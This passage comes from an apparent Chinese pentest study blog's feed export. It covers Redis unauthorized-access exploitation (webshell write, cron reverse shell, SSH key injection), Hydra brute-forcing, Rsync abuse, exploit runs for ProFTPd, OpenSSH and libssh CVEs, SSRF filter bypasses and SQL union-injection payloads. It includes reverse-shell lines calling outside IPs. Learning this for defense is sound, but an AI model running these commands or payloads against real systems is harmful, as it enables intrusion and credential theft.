title="Redis未授权访问-WEBShell&amp;任务&amp;密匙&amp;RCE等"></a>Redis未授权访问-WEBShell&amp;任务&amp;密匙&amp;RCE等</h5><ul><li><p>默认端口：6379</p></li><li><p>未授权访问的条件</p><ul><li><code>bind 127.0.0.1</code>注释符开启则表示只能本地进行访问，如果被注释则可以通过外网访问</li><li><code>protected-mode no</code> 安全模式选项为关闭</li><li>没有设置密码<code># requirepass foobared</code></li></ul></li><li><p>写WEBshell条件</p><ul><li>需要知道web路径</li><li>web目录权限可读写</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">config <span class="hljs-built_in">set</span> <span class="hljs-built_in">dir</span> /tmp           <span class="hljs-comment"># 设置WEB写入目录</span><br>config <span class="hljs-built_in">set</span> dbfilename 1.php   <span class="hljs-comment"># 设置写入文件名</span><br><span class="hljs-built_in">set</span> <span class="hljs-built_in">test</span><span class="hljs-string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>  <span class="hljs-comment"># 设置写入文件内容</span><br>bgsave  <span class="hljs-comment"># 保存执行</span><br>save  <span class="hljs-comment"># 保存执行</span><br></code></pre></td></tr></table></figure></li><li><p>写定时任务反弹shell</p><ul><li>允许异地登录</li><li><code>protected-mode no</code> 安全模式选项为关闭</li></ul></li></ul><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nix">config set dir <span class="hljs-symbol">/var/spool/cron</span>  <span class="hljs-comment"># 记时目录路径</span><br>set yy <span class="hljs-string">&quot;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\n</span>*****bash -i&gt;&amp; /dev/tcp/1.1.1.1/5555 0&gt;&amp;1<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\n</span>&quot;</span> <span class="hljs-comment"># 写入任务代码</span><br>config set dbfilename x<span class="hljs-comment"># 写入文件名</span><br>save <span class="hljs-comment"># 保存</span><br>注意：<br>centos会忽略乱码去执行正确的任务计划，而ubuntu并不会忽略这些乱码，所以导致命令执行失败。<br></code></pre></td></tr></table></figure><ul><li>写入Linux ssh-key公匙<ul><li>允许异地登录</li><li>使用root账户启动</li><li><code>protected-mode no</code> 安全模式选项为关闭</li><li>允许使用密钥登录，远程写入一个密钥，直接远程登录</li></ul></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh-keygen -t rsa <span class="hljs-comment"># 在攻击机上生成一个密钥</span><br><span class="hljs-built_in">cd</span> /root/.ssh/<br>(<span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n\n&quot;</span>; <span class="hljs-built_in">cat</span> id_rsa.pub;<span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n\n&quot;</span>) &gt; key.txt <span class="hljs-comment"># 进入.ssh目录，将密钥写入一个文件中,这里\n是换行符，如果没有这个换行符，redis信息就和ssh公钥的信息拼接到一起了，自然也就无法识别</span><br><span class="hljs-built_in">cat</span> key.txt | redis-cli -h 1.1.1.1 -x <span class="hljs-built_in">set</span> xxx <br>config <span class="hljs-built_in">set</span> dbfilename authorized_keys<br>save<br><span class="hljs-built_in">cd</span> /root/.ssh/<br>ssh -i -id_rsa root@1.1.1.1<br></code></pre></td></tr></table></figure><h3 id="常见应用服务协议"><a href="#常见应用服务协议" class="headerlink" title="常见应用服务协议"></a>常见应用服务协议</h3><h4 id="一、口令猜解-Hydra-FTP-RDP-SSH"><a href="#一、口令猜解-Hydra-FTP-RDP-SSH" class="headerlink" title="一、口令猜解-Hydra-FTP&amp;RDP&amp;SSH"></a>一、口令猜解-Hydra-FTP&amp;RDP&amp;SSH</h4><ul><li><p><a href="https://github.com/vanhauser-thc/thc-hydra">https://github.com/vanhauser-thc/thc-hydra</a></p></li><li><p>hydra是一个自动化的爆破工具，暴力破解弱密码，是一个支持众多协议的爆破工具，已经集成到KaliLinux中，直接在终端打开即可</p></li></ul><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-s PORT 可通过这个参数指定非默认端口。</span><br><span class="hljs-deletion">-l LOGIN 指定破解的用户，对特定用户破解。</span><br><span class="hljs-deletion">-L FILE 指定用户名字典。</span><br><span class="hljs-deletion">-p PASS 小写，指定密码破解，少用，一般是采用密码字典。</span><br><span class="hljs-deletion">-P FILE 大写，指定密码字典。</span><br><span class="hljs-deletion">-e ns 可选选项，n：空密码试探，s：使用指定用户和密码试探。</span><br><span class="hljs-deletion">-C FILE 使用冒号分割格式，例如“登录名:密码”来代替-L/-P参数。</span><br><span class="hljs-deletion">-M FILE 指定目标列表文件一行一条。</span><br><span class="hljs-deletion">-o FILE 指定结果输出文件。</span><br><span class="hljs-deletion">-f 在使用-M参数以后，找到第一对登录名或者密码的时候中止破解。</span><br><span class="hljs-deletion">-t TASKS 同时运行的线程数，默认为16。</span><br><span class="hljs-deletion">-w TIME 设置最大超时的时间，单位秒，默认是30s。</span><br><span class="hljs-deletion">-v / -V 显示详细过程。</span><br>server 目标ip<br><br>service 指定服务名，支持的服务和协议：telnet ftp pop3[-ntlm] imap[-ntlm] smb smbnt http-&#123;head|get&#125; http-&#123;get|post&#125;-form http-proxy cisco cisco-enable vnc ldap2 ldap3 mssql mysql oracle-listener postgres nntp socks5 rexec rlogin pcnfs snmp rsh cvs svn icq sapr3 ssh smtp-auth[-ntlm] pcanywhere teamspeak sip vmauthd firebird ncp afp等等。<br><br>例子：<br>FTP：文件传输协议<br>RDP：Windows远程桌面协议<br>SSH：Linux安全外壳协议<br><br>hydra -L test -P 10top1K.txt 47.110.53.159 ftp -V<br>hydra -l root -P 10top1K.txt 47.110.53.159 ssh -V<br>hydra -l administrator -P 10top1K.txt 47.110.53.159 rdp -V<br></code></pre></td></tr></table></figure><h4 id="二、配置不当-未授权访问-Rsync文件备份"><a href="#二、配置不当-未授权访问-Rsync文件备份" class="headerlink" title="二、配置不当-未授权访问-Rsync文件备份"></a>二、配置不当-未授权访问-Rsync文件备份</h4><ul><li><p>rsync是Linux下一款数据备份工具，支持通过rsync协议、ssh协议进行远程文件传输。其中rsync协议默认监听873端口，如果目标开启了rsync服务，并且没有配置ACL或访问密码，我们将可以读写目标服务器文件。</p></li><li><p>判断：rsync rsync:&#x2F;&#x2F;目标IP:端口号&#x2F;</p></li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs awk">利用：<br>-读取文件：rsync rsync:<span class="hljs-regexp">//</span><span class="hljs-number">123.58</span>.<span class="hljs-number">236.76</span>:<span class="hljs-number">45854</span><span class="hljs-regexp">/src/</span><br>-下载文件：rsync rsync:<span class="hljs-regexp">//</span><span class="hljs-number">123.58</span>.<span class="hljs-number">236.76</span>:<span class="hljs-number">45854</span><span class="hljs-regexp">/src/</span>etc<span class="hljs-regexp">/passwd ./</span><br>-上传文件：rsync -av passwd rsync:<span class="hljs-regexp">//</span><span class="hljs-number">123.58</span>.<span class="hljs-number">236.76</span>:<span class="hljs-number">45854</span><span class="hljs-regexp">/src/</span>tmp/passwd<br><br>反弹shell：<br><span class="hljs-number">1</span>、获取信息：<br>rsync rsync:<span class="hljs-regexp">//</span><span class="hljs-number">123.58</span>.<span class="hljs-number">236.76</span>:<span class="hljs-number">12177</span><span class="hljs-regexp">/src/</span>etc<span class="hljs-regexp">/crontab /</span>root/cron.txt<br><br><span class="hljs-number">2</span>.创建文件 <br>touch shell <br><span class="hljs-comment">#!/bin/bash </span><br><span class="hljs-regexp">/bin/</span>bash -i &gt;&amp; <span class="hljs-regexp">/dev/</span>tcp<span class="hljs-regexp">/47.94.236.117/</span><span class="hljs-number">5566</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br>chmod +x shell<br><br><span class="hljs-number">3</span>、上传文件 <br>rsync -av shell rsync:<span class="hljs-regexp">//</span><span class="hljs-number">123.58</span>.<span class="hljs-number">236.76</span>:<span class="hljs-number">12177</span><span class="hljs-regexp">/src/</span>etc/cron.hourly <br><br><span class="hljs-number">4</span>、等待接受反弹<br></code></pre></td></tr></table></figure><h4 id="三、协议漏洞-应用软件-FTP-Proftpd搭建"><a href="#三、协议漏洞-应用软件-FTP-Proftpd搭建" class="headerlink" title="三、协议漏洞-应用软件-FTP&amp;Proftpd搭建"></a>三、协议漏洞-应用软件-FTP&amp;Proftpd搭建</h4><ul><li><a href="https://github.com/t0kx/exploit-CVE-2015-3306">https://github.com/t0kx/exploit-CVE-2015-3306</a></li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">python exploit<span class="hljs-selector-class">.py</span> <span class="hljs-attr">--host</span> <span class="hljs-number">123.58</span>.<span class="hljs-number">236.76</span> <span class="hljs-attr">--port</span> <span class="hljs-number">24967</span> <span class="hljs-attr">--path</span> &quot;/<span class="hljs-selector-tag">var</span>/www/<span class="hljs-selector-tag">html</span>/&quot;<br></code></pre></td></tr></table></figure><ul><li><a href="http://123.58.236.76:19758/backdoor.php?cmd=id">http://123.58.236.76:19758/backdoor.php?cmd=id</a></li></ul><h4 id="四、协议漏洞-应用软件-SSH-libssh-Openssh"><a href="#四、协议漏洞-应用软件-SSH-libssh-Openssh" class="headerlink" title="四、协议漏洞-应用软件-SSH&amp;libssh&amp;Openssh"></a>四、协议漏洞-应用软件-SSH&amp;libssh&amp;Openssh</h4><ul><li><p>-Openssh CVE-2014-0160 CVE-2018-15473 cve_2020_15778</p></li><li><p>CVE-2014-0160 版本很少</p></li><li><p>cve_2020_15778 价值不高</p></li><li><p>CVE-2018-15473-用户名枚举</p></li><li><p><a href="https://github.com/Rhynorater/CVE-2018-15473-Exploit">https://github.com/Rhynorater/CVE-2018-15473-Exploit</a></p></li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pip3</span> install -r requirements.txt<br><span class="hljs-attribute">pip3</span> install paramiko==<span class="hljs-number">2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">python</span> sshUsernameEnumExploit.py --port <span class="hljs-number">32013</span> --userList exampleInput.txt <span class="hljs-number">123.58.236.76</span><br></code></pre></td></tr></table></figure><ul><li><p>-libssh 身份验证绕过（CVE-2018-10933）</p></li><li><p><a href="https://www.seebug.org/vuldb/ssvid-97614">https://www.seebug.org/vuldb/ssvid-97614</a></p></li><li><p>python libssh.py 123.58.236.76 55190 “id”</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>技术文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞</tag>
      
      <tag>数据库</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>漏洞原理---SSRF</title>
    <link href="/2022/03/18/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86---SSRF/"/>
    <url>/2022/03/18/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86---SSRF/</url>
    
    <content type="html"><![CDATA[<h3 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h3><h4 id="一、什么是SSRF漏洞"><a href="#一、什么是SSRF漏洞" class="headerlink" title="一、什么是SSRF漏洞"></a>一、什么是SSRF漏洞</h4><ul><li>Server-Slde Request Forgery：服务器端请求伪造</li><li>是一种由攻击者构造特殊形式的请求，并且由指定服务器端发起的恶意请求的一个安全漏洞，由于业务运行的服务器处于内外网边界，并且可通过利用当前这台服务器根据所在的网络，访问到与外部网路隔离的内网应用，所以一般情况下，SSRF漏洞攻击目标是攻击者无法直接访问的内网系统</li><li><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301281450675.png" alt="image-20230128145024760"></li><li>目标：从外网无法访问到内部系统</li><li>原因：由于服务器提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制</li></ul><h4 id="二、如何挖掘"><a href="#二、如何挖掘" class="headerlink" title="二、如何挖掘"></a>二、如何挖掘</h4><ul><li>分享：通过URL地址分享网页内容</li><li>转码服务：通过URL地址把源地址的网页内容调优使其适合手机屏幕浏览</li><li>在线翻译：通过URL地址翻译对应文本</li><li>图片加载与下载：通过URL地址下载或加载图片</li><li>图片，文章收藏</li><li>未空开的api实现以及其他调用URL功能</li><li>URL敏感参数：<ul><li>share</li><li>wap</li><li>url</li><li>link</li><li>u</li><li>3g</li><li>imageURL</li><li>domain</li></ul></li></ul><h4 id="三、漏洞危害"><a href="#三、漏洞危害" class="headerlink" title="三、漏洞危害"></a>三、漏洞危害</h4><ul><li>探测内网资产存活</li><li><strong>攻击内网资产：以内网的身份攻击内网</strong></li><li>任意文件读取</li><li>检查IP是否是内网IP</li><li><strong>如果存在漏洞，但是又找不到内网地址情况下—直接爆破！！！！</strong></li></ul><h4 id="四、漏洞函数"><a href="#四、漏洞函数" class="headerlink" title="四、漏洞函数"></a>四、漏洞函数</h4><h5 id="PHP-请求函数"><a href="#PHP-请求函数" class="headerlink" title="PHP(请求函数):"></a>PHP(请求函数):</h5><ul><li>file_get_contents()</li><li>fsockopen()</li><li>fopen()</li><li>curl_exec()</li><li>curl()</li><li>read_file()</li></ul><h5 id="JAVA（请求类）"><a href="#JAVA（请求类）" class="headerlink" title="JAVA（请求类）:"></a>JAVA（请求类）:</h5><ul><li>imagel</li><li>HttpClient</li><li>OKHTTP</li><li>HTTPRequest</li></ul><h4 id="五、如何验证："><a href="#五、如何验证：" class="headerlink" title="五、如何验证："></a>五、如何验证：</h4><ul><li>burp抓包</li><li>右键打开图片</li></ul><h4 id="六、如何绕过对方防御机制"><a href="#六、如何绕过对方防御机制" class="headerlink" title="六、如何绕过对方防御机制"></a>六、如何绕过对方防御机制</h4><ul><li>将IP地址转化为其他进制 —黑名单(<a href="http://0.0.0.0/">http://0/</a>)</li><li>@符号绕过—白名单 <a href="http://www.baidu.com@http//127.0.0.1">http://www.baidu.com@http://127.0.0.1</a></li><li>短网址绕过—-<a href="http://www.dwz.lc/">www.dwz.lc</a></li><li>302跳转绕过</li><li><ul><li>前提是服务器要允许30x跳转</li><li>如果后端服务器在接收到参数后，正确的解析了URL的host，并且进行了过滤，我们这个时候可以使用302跳转的方式来进行绕过。</li><li>百度短网址服务,要钱的并且不支持ip形式<a href="https://dwz.cn/">https://dwz.cn/</a></li><li>这个支持,并且感觉很不错 <a href="http://a.topurl.cn/#/">http://a.topurl.cn/#/</a></li><li>(1)、在网络上存在一个很神奇的服务，<a href="http://xip.io/">http://xip.io</a> 当我们访问这个网站的子域名的时候，例如192.168.0.1.xip.io，就会自动重定向到192.168.0.1。</li><li>(2)、由于上述方法中包含了192.168.0.1这种内网IP地址，可能会被正则表达式过滤掉，我们可以通过短地址的方式来绕过。经过测试发现新浪，百度的短地址服务并不支持IP模式，所以这里使用的是<a href="http://a.topurl.cn/#/%E6%89%80%E6%8F%90%E4%BE%9B%E7%9A%84%E7%9F%AD%E5%9C%B0%E5%9D%80%E6%9C%8D%E5%8A%A1">http://a.topurl.cn/#/所提供的短地址服务</a>.</li><li>这里提一下302跳转和307跳转的区别,307跳转回转发POST请求中的 数据等,但是302跳转不会.</li></ul></li><li>DNS重绑定(再第二次发起攻击)<ul><li><p>使用DNS重绑定的前提：</p><ul><li>攻击者需要对DNS服务器有绝对控制，在上面运行自编的解析服务，使其每次返回的地址均不同</li><li>攻击者需要有自己的域名，这个域名绑定了两条A记录</li><li>将TTL &#x3D; 0，防止响应缓存(一旦缓存，重绑定将无法生效)</li></ul></li><li><p>重绑定前提是先绑定，触发了之后在重新绑定，绑定的是DNS中的解析，解析是A记录(IP地址)</p></li><li><p>在该网址中构建请求地址，获得临时域名</p><ul><li>防御检测代码会首先请求一次域名，判断Ip地址是否是白名单</li><li>DNS服务器在收到首次请求的时候，返回允许的IP地址</li><li>防御检测代码执行后，服务器真正发起DNS请求，请求资源，此时DNS记录以0毫秒的延迟(TTL&#x3D;0)，修改IP地址为127.0.0.1达到绕过SSRF防护的作用</li></ul></li></ul></li></ul><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301281501035.png" alt="image-20230128150136439"></p><ul><li>句号绕过eg:<a href="http://127.0.0.1/">http://127。0。0。1</a></li><li>Enclosed alphanumerics绕过(icon符号)</li></ul><h4 id="七、伪协议"><a href="#七、伪协议" class="headerlink" title="七、伪协议"></a>七、伪协议</h4><ul><li><p>http协议</p><ul><li>传统HTTP协议，用于探测端口</li><li>可获取文件本身</li><li>eg：<code>http://www.baidu.com</code></li></ul></li><li><p>file协议</p><ul><li>读取文件协议，可获取文件中的内容</li><li>eg：<code>file://C:/window/win.ini</code></li></ul></li><li><p>dict协议</p><ul><li>字典服务器协议，用于探测端口</li><li>eg：<code>dict://127.0.0.1:6379/info</code></li><li>banner：服务器指纹信息</li><li>查看服务器信息</li><li>ip addre show</li><li>nc(网络猫)：连接网络上的端口<ul><li>apt install netcat</li><li>yum install netcat</li><li>kali中输入nc IP地址 端口—-&gt;显示服务器指纹信息</li></ul></li></ul></li><li><p>ftp协议</p></li><li><p>FTP文件服务器协议</p></li><li><p>gopher协议</p></li><li><p>FastCGI协议</p></li></ul><h4 id="八、防御漏洞"><a href="#八、防御漏洞" class="headerlink" title="八、防御漏洞"></a>八、防御漏洞</h4><ul><li>限制协议为HTTP&#x2F;HTTPS</li><li>禁止30X跳转</li><li>设置URL白名单或者限制内网IP(使用gethostbyname()判断是否为内网IP</li><li>服务端开启OpenSSL无法交互利用</li><li>服务端需要认证交互</li><li>把用于取外网资源的API部署在不属于自己的机房</li><li>过滤返回信息,验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</li><li>限制请求的端口为http常用的端口，比如 80、443、8080、8090</li><li>统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</li></ul><h4 id="备注："><a href="#备注：" class="headerlink" title="备注："></a>备注：</h4><ul><li>CTFHub中10800端口是一个映射端口，对应内网中的80端口</li><li>一个域名扫描后发现开放80和443端口，此时80端口是一个网站，443端口是另一个网站，只是页面内容看起来是一个网站。</li><li>判断操作系统最简单的办法：大小写敏感测试，大写是Linux系统</li></ul>]]></content>
    
    
    <categories>
      
      <category>技术文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞</tag>
      
      <tag>SSRF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>漏洞原理---SQL注入</title>
    <link href="/2022/03/16/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86---SQL%E6%B3%A8%E5%85%A5/"/>
    <url>/2022/03/16/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86---SQL%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><ul><li>SQL注入原理：<ul><li>可控变量代入数据库查询，并且变量为存在过滤或过滤不严谨</li></ul></li><li>schema（）可以将当前数据库名称显示</li><li>靶场1-4关：总结闭合的方式<ul><li>‘</li><li>‘)</li><li>‘’</li><li>‘’)</li><li>不闭合</li><li><code>secure_file_priv</code>可以设置如下这样进行设置：<ol><li>设置为空，那么对所有路径均可进行导入导出。</li><li>设置为一个目录名字，那么只允许在该路径下导入导出。</li><li>设置为Null，那么禁止所有导入导出。</li></ol></li></ul></li></ul><h4 id="联合注入SQL"><a href="#联合注入SQL" class="headerlink" title="联合注入SQL"></a>联合注入SQL</h4><ul><li>SQL注入的判断方式：<ul><li>在参数后加单引号，查看是否存在sql语法报错，如“<code>**sql syntax**</code>”</li><li>插入简短的payload，查看响应结果是否复合预期；<code>**and 1=1**</code> 页面正常，<code>**and 1=2**</code>页面异常；<code>**and sleep(5)**</code>，确认sql注入点</li><li><code>**order by ? **</code>确定当前网站对接的数据库下的这张表（当前网页使用的这张表）的列数；从1一直往后递增，一直到页面出现报错，或者其他的异常情况，那么最后一次正常回显页面的最大数字就是当前表的列数； order by 3 正常；<code>**order by 4** </code>异常；当前表的列数就是3列；</li><li><code>**union select**</code> 确定有没有回显的点；<code>**id = -1&#39; union select 1,2,3 --+**</code> ，让前面的查不出来值，那么联合查询后面的值就会作为网站输出页面中被取的值；当<code>**id=-1**</code>时，未能在原本的表中查询到对应的信息，那么就会查询到后面的select语句中的值，如果2能够在页面中显示，那么说明2这个位置（一行一列的单元格可以显示内容）；确定网站中注入的回显点！</li><li>在存在回显点的地方，插入自定义的攻击代码，比如<code>**schema()**</code>；可以将当前网站的数据库名称在网页中显示出来。</li><li>继续利用，将<code>**schema()**</code>换成其他的查询代码，以获取更多信息；<ul><li>a. 确定表名；</li><li>b. 确定列名</li><li>c. 根据查询到的表名和列名，查询具体的数据</li></ul></li></ul></li></ul><h3 id="判断是否存在注入点"><a href="#判断是否存在注入点" class="headerlink" title="判断是否存在注入点"></a>判断是否存在注入点</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id <span class="hljs-operator">=</span> <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><ul><li><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301281357750.png" alt="image.png"></li><li><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301281357094.png" alt="image.png"></li><li></li></ul><h3 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id <span class="hljs-operator">=</span> <span class="hljs-number">1</span><span class="hljs-string">&#x27; order by 1-99 --+  # 假设有三列回显</span><br></code></pre></td></tr></table></figure><ul><li><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301281358609.png" alt="image.png"></li><li><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301281358048.png" alt="image.png"></li></ul><h3 id="确定回显点"><a href="#确定回显点" class="headerlink" title="确定回显点"></a>确定回显点</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id <span class="hljs-operator">=</span> <span class="hljs-number">-1</span> unicon <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>，<span class="hljs-number">2</span>，<span class="hljs-number">3</span>   # 假设在<span class="hljs-number">2</span>中有注入点<br></code></pre></td></tr></table></figure><ul><li><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301281358404.png" alt="image.png"></li></ul><h3 id="探测数据库名称"><a href="#探测数据库名称" class="headerlink" title="探测数据库名称"></a>探测数据库名称</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id <span class="hljs-operator">=</span> <span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,database(),3 --+  # security</span><br></code></pre></td></tr></table></figure><ul><li><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301281358613.png" alt="image.png"></li><li>在mySQL中5以上， mysql 默认在数据库中存放在一个叫<code>infomation_schema</code>里 面 ，这个库里面有很多表 重点是这三个表 <code>columns 、tables、SCHEMATA </code>表字 段 <code>CHEMA_NAME</code> 记录着库的信息</li></ul><h3 id="判断数据库中的表"><a href="#判断数据库中的表" class="headerlink" title="判断数据库中的表"></a>判断数据库中的表</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,  (select group_concat(table_name) from information_schema.`TABLES` where table_schema = schema()) ,3 --+</span><br></code></pre></td></tr></table></figure><ul><li><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301281359935.png" alt="image.png"></li></ul><h3 id="判断列"><a href="#判断列" class="headerlink" title="判断列"></a>判断列</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,  (select group_concat(table_name) from information_schema.`TABLES` where table_name = &#x27;</span>users<span class="hljs-string">&#x27;) ,3 --+</span><br></code></pre></td></tr></table></figure><ul><li><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301281359890.png" alt="image.png"></li></ul><h3 id="根据列表名和列名，查具体数据"><a href="#根据列表名和列名，查具体数据" class="headerlink" title="根据列表名和列名，查具体数据"></a>根据列表名和列名，查具体数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,  (select  group_concat(username,&#x27;</span><span class="hljs-operator">-</span><span class="hljs-string">&#x27;,Password) from users) ,3 --+</span><br></code></pre></td></tr></table></figure><ul><li><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301281359679.png" alt="image.png"></li><li>总结：<ul><li>SQL注入的目的是为了获取数据库中的信息</li><li>简单测试注入时先在搜索框中使用万能语句进行判断如：<code>id = 1&#39; or 1 = 1 --+</code>  如果显示与当前页面内容一致，则说明存在<code>SQL</code>注入</li><li>在判断存在注入后，使用<code>order  by 1-99</code> 对字段进行探测（<code>order by</code> 表示按第几列进行排序）。判断出当前网页中的数据库中的表有几个字段(判断当前表中的列数)，</li><li>这里使用<code>order by</code> 的目的在于，<code>order by</code>在判断出存在几个字段后，使用<code>union </code>联合查询，确认回显位置</li></ul></li></ul><h4 id="报错注入-1-5-6"><a href="#报错注入-1-5-6" class="headerlink" title="报错注入(1,5,6)"></a>报错注入(1,5,6)</h4><ul><li>xml：可以存放数据，存放http协议之间传输信息，大型框架的配置文件（yml，config，ini….）</li><li><code>UPDATEXML (XML_document, XPath_string, new_value);</code><br>  第一个参数：<code>XML_document</code>是<code>String</code>格式，为<code>XML</code>文档对象的名称，文中为Doc。（更新哪个xml，更新xml在什么地方，更新成什么值）<br>  第二个参数：<code>XPath_string</code> (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>  第三个参数：<code>new_value</code>，<code>String</code>格式，替换查找到的符合条件的数据</li></ul><h4 id="报错注入是在第二个参数中发生，原因？"><a href="#报错注入是在第二个参数中发生，原因？" class="headerlink" title="报错注入是在第二个参数中发生，原因？"></a>报错注入是在第二个参数中发生，原因？</h4><ul><li>因为在执行updatexml()函数时，会先检查XPath语法是否合规，如同写java代码一样，先对语法进行检查</li></ul><h4 id="什么是poc，explpit-，payload"><a href="#什么是poc，explpit-，payload" class="headerlink" title="什么是poc，explpit ，payload"></a>什么是poc，explpit ，payload</h4><ul><li>一段能够利用漏洞并且具有攻击性的代码称之为poc</li><li>操作系统级别的漏洞为<code>exloit</code></li><li>一段利用漏洞的代码，载荷—&gt;<code>payload</code></li></ul><h4 id="为什么能使用报错注入？"><a href="#为什么能使用报错注入？" class="headerlink" title="为什么能使用报错注入？"></a>为什么能使用报错注入？</h4><ul><li>因为开发人员在开发时，将<code>print_r(mysql_error());</code>写入代码当中，如果将这句代码注释掉或者进行替换则前端将不再显示错误信息</li></ul><h4 id="“-”–-十六进制：0x7e，它的作用"><a href="#“-”–-十六进制：0x7e，它的作用" class="headerlink" title="“~”–&gt;十六进制：0x7e，它的作用?"></a>“~”–&gt;十六进制：0x7e，它的作用?</h4><ul><li>作用是占位符标记开头和结尾，如果没有这个占位符则报错信息将会显示不完全，但是这里不一定是“~”，还可以用其他符号代替.</li><li>可以没有后面占位符，但是不能没有前面的占位符</li></ul><h4 id="select-version-—-显示当前数据库版本号信息"><a href="#select-version-—-显示当前数据库版本号信息" class="headerlink" title="select  version() —-&gt;显示当前数据库版本号信息"></a>select  version() —-&gt;显示当前数据库版本号信息</h4><ul><li>select  